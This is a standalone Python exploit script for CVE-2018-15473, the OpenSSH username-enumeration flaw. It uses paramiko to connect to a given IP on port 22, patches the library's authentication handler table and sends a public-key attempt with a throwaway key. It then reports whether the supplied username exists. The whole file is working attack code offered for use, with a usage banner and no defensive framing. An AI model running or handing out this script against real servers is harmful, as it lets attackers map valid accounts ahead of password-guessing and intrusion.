#!/usr/bin/env python3
import socket
import paramiko
import sys
import logging

# 1. Fix the Monkeypatch for Python 3
# This is required to trigger the CVE-2018-15473 vulnerability
def patch_dispatch_table():
    def malformed_packet(*args, **kwargs):
        # We replace the legitimate handler with one that causes 
        # a failure the server interprets differently for valid/invalid users.
        raise paramiko.ssh_exception.SSHException("Malformed packet")

    # Accessing the internal handler table
    paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malformed_packet

def check_user(target_ip, target_port, username):
    # Use 'sock_obj' to avoid any conflict with 'socket' module name
    sock_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock_obj.settimeout(5)
    
    try:
        sock_obj.connect((target_ip, target_port))
    except Exception as e:
        print(f"[-] Connection failed to {target_ip}:{target_port} - {e}")
        return

    # Initialize Paramiko transport
    transport = paramiko.Transport(sock_obj)
    try:
        transport.start_client()
    except paramiko.SSHException as e:
        print(f"[-] SSH negotiation failed: {e}")
        return

    try:
        # We attempt public key auth with a dummy key.
        # On OpenSSH 7.4:
        # - Valid user: Server tries to process key -> throws AuthenticationException
        # - Invalid user: Server rejects early -> throws different Exception or closes
        transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
    except paramiko.AuthenticationException:
        print(f"[+] {username} is a VALID user")
    except Exception:
        print(f"[-] {username} is an INVALID user")
    
    transport.close()

def main():
    # Suppress verbose paramiko logging
    logging.getLogger("paramiko").setLevel(logging.CRITICAL)

    if len(sys.argv) < 3:
        print("-" * 40)
        print("OpenSSH 7.4 User Enumeration (CVE-2018-15473)")
        print("-" * 40)
        print(f"Usage: python3 {sys.argv[0]} <ip> <username>")
        sys.exit(1)

    ip = sys.argv[1]
    user = sys.argv[2]
    
    # Apply the fix to the paramiko library logic
    patch_dispatch_table()
    
    print(f"[*] Probing {ip} for user: {user}")
    check_user(ip, 22, user)

if __name__ == "__main__":
    main()
